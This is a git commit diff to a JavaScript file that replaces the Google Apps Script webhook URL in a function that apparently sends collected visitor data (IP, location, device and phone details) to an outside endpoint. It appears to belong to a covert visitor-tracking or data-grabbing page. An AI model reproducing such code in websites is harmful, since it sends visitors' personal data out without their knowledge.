19d0a5d969de5360243970497e4524a7b494a323
socialtopnews <lewandowski2557@gmail.com>
2025-04-13 00:40:42 +0700

    Update script.js

--- script.js
+++ script.js
@@ -863,7 +863,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycby5jWeeA-kziE5UJ-etUP0LyFKEVoNx-zF-LDFa9CIIkbEu0vN9_JI2fKzmvdadpx9F2A/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
